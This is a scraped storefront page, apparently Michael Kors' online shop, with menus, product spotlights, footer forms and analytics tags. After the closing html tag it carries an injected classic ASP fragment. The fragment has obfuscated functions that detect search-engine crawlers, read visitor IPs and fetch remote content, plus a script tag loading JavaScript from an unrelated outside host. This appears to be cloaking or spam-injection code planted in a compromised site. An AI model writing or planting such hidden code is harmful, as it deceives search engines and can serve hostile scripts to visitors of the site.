<ul class="menuUL TrendMenu">
<li><div class="menu_head_tit">
TRENDS</div></li>
<li><a
href="/trend/michael-s-must-haves/_/N-1z140xo">
MICHAEL&#39;S MUST HAVES</a></li>
<li><a
href="/trend/untamed-glamour/_/N-1z140kq">
UNTAMED GLAMOUR</a></li>
<li><a
href="/trend/rock-chic/_/N-1z140ks">
ROCK CHIC</a></li>
<li><a
href="/trend/all-that-glitters/_/N-1z140km">
ALL THAT GLITTERS</a></li>
<li><a
href="/trend/party-looks/_/N-1z140ey">
PARTY LOOKS</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/ruth-metallic-sneaker/_/R-US_43H4RUFS1M?color=0710">
<img alt="Ruth Metallic Sneaker" src="http://michaelkors.scene7.com/is/image/MichaelKors/43H4RUFS1M-0710_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/anya-leather-ankle-boot/_/R-US_40R5ANFE6L?color=0001">
<img alt="Anya Leather Ankle Boot" src="http://michaelkors.scene7.com/is/image/MichaelKors/40R5ANFE6L-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/mavis-embossed-leather-sandal/_/R-US_40F4MVHS1E?color=0705">
<img alt="Mavis Embossed-Leather Sandal" src="http://michaelkors.scene7.com/is/image/MichaelKors/40F4MVHS1E-0705_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/mavis-open-toe-suede-sandal/_/R-US_40F4MVHS2S?color=0880">
<img alt="Mavis Open-Toe Suede Sandal" src="http://michaelkors.scene7.com/is/image/MichaelKors/40F4MVHS2S-0880_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/francoise-t-strap-suede-pump/_/R-US_40H4FRHS3S?color=0001">
<img alt="Francoise T-Strap Suede Pump" src="http://michaelkors.scene7.com/is/image/MichaelKors/40H4FRHS3S-0001_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment5" class="dept-dd group">
<input type="hidden"
value='WATCHES'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/watches/women/_/N-28c5" title="WOMEN">WOMEN</a></li>
<li><a href="/watches/men/_/N-28cf" title="MEN">MEN</a></li>
<li><a href="/watches/watch-hunger-stop/_/N-28z7" title="WATCH HUNGER STOP">WATCH HUNGER STOP</a></li>
</ul>
<ul class="menuUL TrendMenu">
<li><div class="menu_head_tit">
TRENDS</div></li>
<li><a
href="/trend/michael-s-must-haves/_/N-1z140xo">
MICHAEL&#39;S MUST HAVES</a></li>
<li><a
href="/trend/a-twist-on-the-classics/_/N-1z140kr">
A TWIST ON THE CLASSICS</a></li>
<li><a
href="/trend/all-that-glitters/_/N-1z140km">
ALL THAT GLITTERS</a></li>
<li><a
href="/trend/party-looks/_/N-1z140ey">
PARTY LOOKS</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/colette-onyx-and-gold-tone-watch/_/R-US_MK6070?color=0710">
<img alt="Colette Onyx and Gold-Tone Watch" src="http://michaelkors.scene7.com/is/image/MichaelKors/MK6070-0710_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/colette-rose-gold-tone-watch/_/R-US_MK6071?color=0622">
<img alt="Colette Rose Gold-Tone Watch" src="http://michaelkors.scene7.com/is/image/MichaelKors/MK6071-0622_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/colette-silver-and-gold-tone-watch/_/R-US_MK6072?color=0991">
<img alt="Colette Silver and Gold-Tone Watch" src="http://michaelkors.scene7.com/is/image/MichaelKors/MK6072-0991_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment6" class="dept-dd group">
<input type="hidden"
value='ACCESSORIES'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/accessories/jewelry/_/N-282d" title="JEWELRY">JEWELRY</a></li>
<li><a href="/accessories/wallets/_/N-282c" title="WALLETS">WALLETS</a></li>
<li><a href="/accessories/sunglasses/_/N-282k" title="SUNGLASSES">SUNGLASSES</a></li>
<li><a href="/accessories/fragrance-beauty/_/N-282l" title="FRAGRANCE & BEAUTY">FRAGRANCE & BEAUTY</a></li>
<li><a href="/accessories/belts-scarves/_/N-282m" title="BELTS & SCARVES">BELTS & SCARVES</a></li>
<li><a href="/accessories/keychains/_/N-282n" title="KEYCHAINS">KEYCHAINS</a></li>
<li><a href="/accessories/tech/_/N-282o" title="TECH">TECH</a></li>
<li><a href="/accessories/cold-weather/_/N-282p" title="COLD WEATHER">COLD WEATHER</a></li>
<li><a href="/accessories/men/_/N-282q" title="MEN">MEN</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/pavé-gold-tone-ring/_/R-US_MKJ3749?color=0710">
<img alt="Pavé Gold-Tone Ring" src="http://michaelkors.scene7.com/is/image/MichaelKors/MKJ3749-0710_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/asymmetrical-gold-tone-bangle/_/R-US_MKJ4023?color=0710">
<img alt="Asymmetrical Gold-Tone Bangle" src="http://michaelkors.scene7.com/is/image/MichaelKors/MKJ4023-0710_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/pavé-gold-tone-arrow-necklace/_/R-US_MKJ4049?color=0710">
<img alt="Pavé Gold-Tone Arrow Necklace" src="http://michaelkors.scene7.com/is/image/MichaelKors/MKJ4049-0710_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/pavé-tri-tone-triangle-ring/_/R-US_MKJ3958?color=0995">
<img alt="Pavé Tri-Tone Triangle Ring" src="http://michaelkors.scene7.com/is/image/MichaelKors/MKJ3958-0995_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment7" class="dept-dd group">
<input type="hidden"
value='GIFTS'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/gifts/gifts-for-her/_/N-284j" title="GIFTS FOR HER">GIFTS FOR HER</a></li>
<li><a href="/gifts/gifts-for-him/_/N-284q" title="GIFTS FOR HIM">GIFTS FOR HIM</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/duracell-powermat-kit-for-iphone-5-5s/_/R-US_32H4GELP2P?color=0581">
<img alt="Duracell Powermat Kit for iPhone 5/5s" src="http://michaelkors.scene7.com/is/image/MichaelKors/32H4GELP2P-0581_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment8" class="dept-dd group">
<input type="hidden"
value='SALE'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
Sale</div></li>
<li><a href="/sale/view-all/_/N-28zn" title="VIEW ALL">VIEW ALL</a></li>
<li><a href="/sale/bags/_/N-289z" title="BAGS">BAGS</a></li>
<li><a href="/sale/shoes/_/N-28a9" title="SHOES">SHOES</a></li>
<li><a href="/sale/watches/_/N-28ah" title="WATCHES">WATCHES</a></li>
<li><a href="/sale/clothing/_/N-289m" title="CLOTHING">CLOTHING</a></li>
<li><a href="/sale/jewelry-accessories/_/N-28al" title="JEWELRY & ACCESSORIES">JEWELRY & ACCESSORIES</a></li>
<li><a href="/sale/men/_/N-28au" title="MEN">MEN</a></li>
<li><a href="/sale/petites/_/N-296s" title="PETITES">PETITES</a></li>
<li><a href="/sale/plus-sizes/_/N-296t" title="PLUS SIZES">PLUS SIZES</a></li>
</ul>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment9"  class="dept-dd group DK-menu">
<ul id="menu-main-menu" class="menuUL menu">
<li id="" class=""><a href="http://destinationkors.michaelkors.com/jet-set/" class="menu-link main-menu-link"><span>Jet Set</span></a>
<ul class="sub-menu menu-odd  menu-depth-1">
<li id="" class=""><a href="http://destinationkors.michaelkors.com/jet-set/travel-diaries/" class="menu-link sub-menu-link"><span>Travel Diaries</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/jet-set/celebrities/" class="menu-link sub-menu-link"><span>Celebrities</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/jet-set/around-the-world/" class="menu-link sub-menu-link"><span>Around the World </span></a>
</li>
</ul>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/michaels-edit/" class="menu-link main-menu-link"><span>Michael's Edit</span></a>
<ul class="sub-menu menu-odd  menu-depth-1">
<li id="" class=""><a href="http://destinationkors.michaelkors.com/michaels-edit/style-confidential/" class="menu-link sub-menu-link"><span>Style Confidential</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/michaels-edit/must-haves/" class="menu-link sub-menu-link"><span>Michael's Must-Haves</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/michaels-edit/spotlight-on/" class="menu-link sub-menu-link"><span>Spotlight On</span></a>
</li>
</ul>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/runway/" class="menu-link main-menu-link"><span>Runway</span></a>
<ul class="sub-menu menu-odd  menu-depth-1">
<li id="" class=""><a href="http://destinationkors.michaelkors.com/runway/runway-shows/" class="menu-link sub-menu-link"><span>Runway Shows</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/runway/lookbooks/" class="menu-link sub-menu-link"><span>Lookbooks</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/runway/ad-campaigns/" class="menu-link sub-menu-link"><span>Ad Campaigns</span></a>
</li>
</ul>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/kors-cares/" class="menu-link main-menu-link"><span>Kors Cares</span></a>
<ul class="sub-menu menu-odd  menu-depth-1">
<li id="" class=""><a href="http://destinationkors.michaelkors.com/kors-cares/watch-hunger-stop/" class="menu-link sub-menu-link"><span>Watch Hunger Stop</span></a>
</li>
<li id="" class=""><a href="http://destinationkors.michaelkors.com/kors-cares/gods-love-deliver/" class="menu-link sub-menu-link"><span>Gods Love We Deliver</span></a>
</li>
</ul>
</li>
</ul>
</div>
</div>
<footer class="group">
<input type="hidden" id="qty_selc" value=""/>
<!--
Start of DoubleClick Floodlight Tag: Please do not remove
Activity name of this tag: MK-US-D-Global Footer
URL of the webpage where the tag is expected to be placed: http://www.michaelkors.com
This tag must be placed between the <body> and </body> tags, as close as possible to the opening tag.
Creation Date: 01/22/2014
-->
<script type="text/javascript">
var axel = Math.random() + "";
var a = axel * 10000000000000;
document.write('<iframe src="http://4350594.fls.doubleclick.net/activityi;src=4350594;type=categ429;cat=mk-d-774;u19=;ord=1;num=' + a + '?" width="1" height="1" frameborder="0" style="display:none"></iframe>');
</script>
<noscript>
<iframe src="http://4350594.fls.doubleclick.net/activityi;src=4350594;type=categ429;cat=mk-d-774;u19=;ord=1;num=1?" width="1" height="1" frameborder="0" style="display:none"></iframe>
</noscript>
<!-- End of DoubleClick Floodlight Tag: Please do not remove -->
<div id="footer">
<div class="footer-inner">
<div id="badgeLogo">
<img src="/img/logo_mk_badge_new.png" alt="Michael Kors" title="Michael Kors" width="95" height="72"/>
<!--<img src="/img/logo_mk_badge.png" alt="Michael Kors" title="Michael Kors" width="89" height="67"/>-->
</div>
<form id="mailingListSignUpForm" name="mailingListSignUpForm" action="/sale/_/N-289l?_DARGS=/includes/footer.jsp.regForm" class="submitFormAjax" method="post" autocomplete="off"><input name="_dyncharset" value="UTF-8" type="hidden"></input><input value="-2018191505099424157" type="hidden"></input><label id="mailingListSignUploginLabels" for="mailingListSignUplogin" class="form-label">Sign up <span>for</span> OUR EMAILS</label><br />
<div class="footerInputContainer" >
<span class="mailingListSignUpForm_input signin_mail"><input id="mailingListSignUplogin" aria-labelledby="mailingListSignUploginLabel mailingListSignUploginError" placeholder="Enter your email address&#8230" name="mailingListSignUplogin" onblur="this.placeholder = 'Enter your email address&#8230' " value="" class="form-field-large" onfocus="this.placeholder = ''" type="text" autocomplete="off"><input name="_D:mailingListSignUplogin" value=" " type="hidden"></span>
<span class="mailingListSignUpForm_submit dep_footer_align">
<input id="submitMailingList" alt="Join Email List" name="submitMailingList" value="Join" onclick="emailSubscription()" type="submit"><input name="_D:submitMailingList" value=" " type="hidden"></span>
<br />
<div class="field-missing-text">
<div class="clear"></div>
<label id="mailingListSignUploginError"
for="mailingListSignUplogin"></label></div>
<input id="successUrl" name="successUrl" value="/stores/newsletter_signup.jsp" type="hidden"><input name="_D:successUrl" value=" " type="hidden"><input id="errorUrl" name="errorUrl" value="/index.jsp" type="hidden"><input name="_D:errorUrl" value=" " type="hidden"><input type="hidden" name="formHandler" id="formHandler"
value="/atg/userprofiling/ProfileFormHandler" />
<input type="hidden" name="handleMethod" id="handleMethod"
value="EmailSubscriptionValidation" />
</div>
<input name="_DARGS" value="/includes/footer.jsp.regForm" type="hidden"></input></form><form id="storeFinderForm" name="storeFinderForm" action="/stores/?_DARGS=/includes/footer.jsp" class="submitFormAjax right" method="post" autocomplete="off"><input name="_dyncharset" value="UTF-8" type="hidden"></input><input value="-2018191505099424157" type="hidden"></input><label for="zipCodeStoreFinder" id="zipCodeStoreFinderLabel"><a href="/stores/search/united-states/25">Visit a store <span>in</span> your area</label></a>
<br />
<div class="footerInputContainer" >
<span class="mailingListSignUpForm_input"><input id="storeLocatorAddressField" maxlength="20" placeholder="Enter your postal code&#8230" name="/com/mk/store/MKStoreLocatorFormHandler.storeFinderBean.storeLocatorAddressField" onblur="this.placeholder = 'Enter your postal code&#8230'" value="" onfocus="this.placeholder = ''" type="text" autocomplete="off"><input name="_D:/com/mk/store/MKStoreLocatorFormHandler.storeFinderBean.storeLocatorAddressField" value=" " type="hidden"></span>
<span class="mailingListSignUpForm_submit dep_footer_align">
<input id="StoreFinderSearchBtn" alt="Find A Store" name="/com/mk/store/MKStoreLocatorFormHandler.findStore" value="Find" type="submit"><input name="_D:/com/mk/store/MKStoreLocatorFormHandler.findStore" value=" " type="hidden"></span>
<br />
<div class="field-missing-text"><label
id="storeLocatorAddressFieldError" for="storeLocatorAddressField"></label></div>
<input name="/com/mk/store/MKStoreLocatorFormHandler.country" value="US" type="hidden"><input name="_D:/com/mk/store/MKStoreLocatorFormHandler.country" value=" " type="hidden"><input type="hidden" id="successUrl" name="successUrl"
value="/stores/" />
<input type="hidden" name="formHandler" id="formHandler"
value="/com/mk/store/MKStoreLocatorFormHandler" />
<input type="hidden" name="handleMethod" id="handleMethod"
value="findStore" />
</div>
<input name="_DARGS" value="/includes/footer.jsp" type="hidden"></input></form></div>
<div class="footer-bottom group">
<div id="collapseSubNav">
</div>
<div id="showSubNav">
</div>
<input type="hidden" name="selectedView" id="selectedView" value="false"/>
<form id="selectedViewFormDown" name="selectedViewFormDown" action="?_DARGS=/includes/selectedViewClose.jsp.selectedViewFormDown" class="submitFormAjax" method="post" autocomplete="off"><input name="_dyncharset" value="UTF-8" type="hidden"></input><input value="-2018191505099424157" type="hidden"></input><input name="selectedViewFormDown" src="/img/icon-chevron-down.png" type="image"><input name="_D:selectedViewFormDown" value=" " type="hidden"><input id="successUrl" name="successUrl" value="/index.jsp" type="hidden"><input name="_D:successUrl" value=" " type="hidden"><input id="errorUrl" name="errorUrl" value="" type="hidden"><input name="_D:errorUrl" value=" " type="hidden"><input type="hidden" name="formHandler" id="formHandler" value="/atg/userprofiling/ProfileFormHandler"/>
<input type="hidden" name="handleMethod" id="handleMethod" value="selectedView"/>
<input name="_DARGS" value="/includes/selectedViewClose.jsp.selectedViewFormDown" type="hidden"></input></form><form id="selectedViewFormUp" name="selectedViewFormUp" action="?_DARGS=/includes/selectedViewClose.jsp.selectedViewFormUp" class="submitFormAjax" method="post" autocomplete="off"><input name="_dyncharset" value="UTF-8" type="hidden"></input><input value="-2018191505099424157" type="hidden"></input><input name="selectedViewFormUp" src="/img/icon-chevron-up.png" type="image"><input name="_D:selectedViewFormUp" value=" " type="hidden"><input id="successUrl" name="successUrl" value="/index.jsp" type="hidden"><input name="_D:successUrl" value=" " type="hidden"><input id="errorUrl" name="errorUrl" value="" type="hidden"><input name="_D:errorUrl" value=" " type="hidden"><input type="hidden" name="formHandler" id="formHandler" value="/atg/userprofiling/ProfileFormHandler"/>
<input type="hidden" name="handleMethod" id="handleMethod" value="selectedView"/>
<input name="_DARGS" value="/includes/selectedViewClose.jsp.selectedViewFormUp" type="hidden"></input></form><div class="footer-bottom_inner">
<nav id="footerNavMenu" class="group" >
<ul class="group" >
<li id="nameLogo">
<img width="355" height="58" src="/img/logo_mk.png" alt="Michael Kors" id="siteTitleImage" /></li>
<li class="company"><span style="cursor: default;">COMPANY</span>  	<ul style="display: block;">  		
<li><a href="/browse/common/staticContent.jsp?slotId=400005">ABOUT US</a></li>  	
<li><a href="/stores">STORE LOCATOR</a></li> 
<li><a href="http://www.watchhungerstop.com" target="_blank">Kors Cares</a></li>  
<li><a href="/browse/common/staticContent.jsp?slotId=4500008">Careers</a></li>  
<li><a href="http://investors.michaelkors.com/" target="_blank">INVESTOR RELATIONS</a></li>  		
<li><a href="http://investors.michaelkors.com/resources/supply-chain-disclosure/default.aspx" target="_blank">SUPPLY CHAIN DISCLOSURE</a></li> 
<li><a href="/trend/catalog/_/R-cat2450002">CATALOG</a></li> 
</ul>  </li><li>

                <span>CUSTOMER SERVICE</span>

                <ul>
                               

                                <li>

                                                <a href="/browse/common/staticContent.jsp?slotId=400007" onclick="_gaq.push(['_trackEvent','Footer Links','FAQ','Help']);">FAQ</a>

                                </li>
  <li>

                                                <a href="/account/order_status.jsp" onclick="_gaq.push(['_trackEvent','Footer Links','Track My Order','Help']);">Track My Order</a>

                                </li>

                                <li>

                                                <a href="/browse/common/staticContent.jsp?slotId=400008" onclick="_gaq.push(['_trackEvent','Footer Links','Returns & Exchanges','Help']);">Returns & Exchanges</a>

                                </li>
   <li>

                                                <a href="/browse/common/staticContent.jsp?slotId=2200017" onclick="_gaq.push(['_trackEvent','Footer Links',Shipping Policy','Help']);">Shipping Terms</a>

                                </li>
   <li>

                                                <a href="/browse/common/staticContent.jsp?slotId=2800029" onclick="_gaq.push(['_trackEvent','Footer Links','Payment Policy','Help']);">Payment Information</a>

                                </li>
<li>

                                                <a href="/browse/giftcard/gift_card_landing.jsp" onclick="_gaq.push(['_trackEvent','Footer Links','Gift Card','Help']);">Gift Cards</a>

                                </li>
                               
  
                                  <li>

                                                <a href="/browse/common/contact_us.jsp" onclick="_gaq.push(['_trackEvent','Footer Links','Contact Us','Help']);" >Contact us</a>

                                </li>

     <li>

                                                <a href="/browse/common/staticContent.jsp?slotId=3100002" onclick="_gaq.push(['_trackEvent','Footer Links','Warranty & Repair','Help']);">Warranty & Repair</a>

                                </li>

                                

                </ul>

</li><li class="last">
<span>My Account</span>
<ul>
<li><a href="/account/create_account.jsp?_requestid=61005">REGISTER</a></li>
<li><a href="/browse/common/staticContent.jsp?slotId=3800001">Accounts</a></li>
<li><a href="/browse/common/staticContent.jsp?slotId=2200002">Privacy Policy</a></li>
<li><a href="/browse/common/staticContent.jsp?slotId=2000006">Terms &amp; Conditions</a></li>
<li><a href="/browse/common/staticContent.jsp?slotId=2400006">Cookie Policy</a></li>
</ul>
</li><li id="socialLinks">
 <div class="closeSocialLinks"><ul class="closeSocialLinksul"><li id="facebook"><a href="https://www.facebook.com/michaelkors" target="_blank"><span>Facebook</span></a></li>       <li id="twitter"><a href="https://twitter.com/michaelkors" target="_blank"><span>Twitter</span></a></li>       <li id="instagram"><a href="http://instagram.com/michaelkors#" target="_blank"><span>Instagram</span></a></li>       <li id="youtube"><a href="http://www.youtube.com/user/michaelkors" target="_blank"><span>Youtube</span></a></li>       <li id="pinterest" class="last"><a href="http://www.pinterest.com/michaelkors/" target="_blank"><span>Pinterest</span></a></li>     </ul> </div><ul class="socialul">       <li class="last"><span style="cursor: default;">FOLLOW US</span> </li>       <li id="facebook"><a href="https://www.facebook.com/michaelkors" target="_blank"><span>Facebook</span></a></li>       <li id="twitter"><a href="https://twitter.com/michaelkors" target="_blank"><span>Twitter</span></a></li>       <li id="instagram"><a href="http://instagram.com/michaelkors#" target="_blank"><span>Instagram</span></a></li>       <li id="youtube"><a href="http://www.youtube.com/user/michaelkors" target="_blank"><span>Youtube</span></a></li>       <li id="pinterest" class="last"><a href="http://www.pinterest.com/michaelkors/" target="_blank"><span>Pinterest</span></a></li>     </ul> </li>
</ul>
</nav>
</div>
<div class="copyright_txt">&copy;&nbsp;2014&nbsp;Michael Kors</div>
</div>
<!-- for Omniture include -->
<input type="hidden" value="mkorusprod" id="sAccountVar"/>
<input type="hidden" value="michaelkors" id="sVisitorNamespace"/>
<input type="hidden" value="metrics.michaelkors.com" id="sTrackingServer"/>
<input type="hidden" value="smetrics.michaelkors.com" id="sTrackingServerSecure"/>
<input type="hidden" id="trackingPageName" value='browse'/>
<script type="text/javascript">
$(document).ready(function(){
var url=window.location.href;
var dom = window.location.origin;
var prop = url.replace(dom, "");
if(prop == "/"){
s.prop14 = "home.html";
}else{
s.prop14 = prop;
}
});
function siteCatalyst(){
s.pageName = 'SALE';
s.eVar43 = 'cat20011';
s.eVar28 = 'ecommerce:desktop';
s.channel = 'SALE';
s.prop1 = 'browse';
s.prop2 = 'SALE';
s.prop3 = 'SALE';
s.eVar4 = 'SALE';
s.eVar5 = 'SALE';
s.eVar6 = 'SALE';
s.eVar29= 'US:en';
s.eVar35 = 'D=c14';
var s_code=s.t();
if(s_code){
document.write(s_code);
}
}
</script>
<div class="gradient_bg"></div>
</footer>
<div id="container" style="display: none;"></div>
<script type="text/javascript" src="/js/flexiSlider/jquery.flexslider-min.js"></script>

            

            <script type="text/javascript" src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
                       
            <script>
		(function($){
			$(window).load(function(){
				 $('#miniCartContiainer').hide();
			});
		})(jQuery);
	</script>
            
	         <!-- for Omniture include --><!--
			 <script type="text/javascript" src="/js/adobe/s_code.js"></script>
			 <script type="text/javascript" src="/js/adobe/omniture-click.js"></script>
			 
			 --><script type="text/javascript">
			 $(document).ready(function(){
				 siteCatalyst();
				});
			 /*  window.onload = function(){
						siteCatalyst();
					} */
				</script>
			<!-- Omniture Include ends -->
			<script type="text/javascript" language="javascript" src="http://michaelkors.scene7.com/s7viewers/html5/js/FlyoutViewer.js"></script>
			<script type="text/javascript" src="/js/jquery.mousewheel.js"></script>
			<script type="text/javascript" src="/js/jquery.jscrollpane.js"></script>
			<script type="text/javascript" src="/js/customInput.jquery.js"></script>
			<script type="text/javascript" src="/js/tooltip/jquery.tooltipster.min.js"></script>
			<script type="text/javascript" src="/js/jquery.selectbox-0.2.js"></script>
			<script type="text/javascript">
				var contextRoot = "";
				</script>
		   	
		   	<script type="text/javascript" src="/js/vendor/jquery.carouFredSel-6.2.0-packed.js"></script>
			<script type="text/javascript" src="/js/jquery.touchSwipe.js"></script>
			<script type="text/javascript" src="/js/flexiSlider/jquery.flexslider-min.js"></script>
			<script type="text/javascript" src="/js/vendor/jquery.getUrlParam.js"></script>
			<script type="text/javascript" src="/js/vendor/jquery.validate.min.js"></script>
			<script type="text/javascript" src="/js/vendor/jquery.placeholder.js"></script>
			<!--[if lt IE 9]>
				<script src="/js/vendor/html5shiv.js"></script>
			<![endif]-->
	<!-- <script type="text/javascript" src="/js/min/extras.js"></script>
			<script type="text/javascript" src="/js/min/0.js"></script>
		
	
	--><!--[if lt IE 10]>
	<script>
		formPlaceholderFix();
	</script>
	<![endif]-->
<script type="text/javascript">
	$(function()
{
		$('.scroll-pane').jScrollPane();
		$('input.css-checkbox').customInput();
		$("#content_1").jScrollPane();
		$("select").selectbox(); 
		/* $('input, textarea').placeholder(); For latest version, Initialisation is not needed.  */
});
		
	
	$ = jQuery.noConflict();
		$(document).ready(
				function(event){
					$("#searchText").endecaSearchSuggest(
							{ 
								minAutoSuggestInputLength: 3,
								autoSuggestServiceUrl: '/endeca_search/searchAutoCompleteGuidedSearch.jsp?Ntk=AutoComplete&Ntx=mode+matchallany',
								collection:"/services/guidedsearch",
								categoryUrl: '',
								skuUrl: '',
								containerClass:'dimSearchSuggContainer',
								defaultImage:''
							}
						);
				}
			);
		</script>	
		<script type="text/javascript" src="/js/min/0.js"></script>
	
			

	
		
			
			
<div id="dummyDiv" style="display:none;"></div>
<script type="text/javascript" src="/js/shop.js"></script>
</body>
</html>



<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/a/meika.js" type="text/javascript"></script>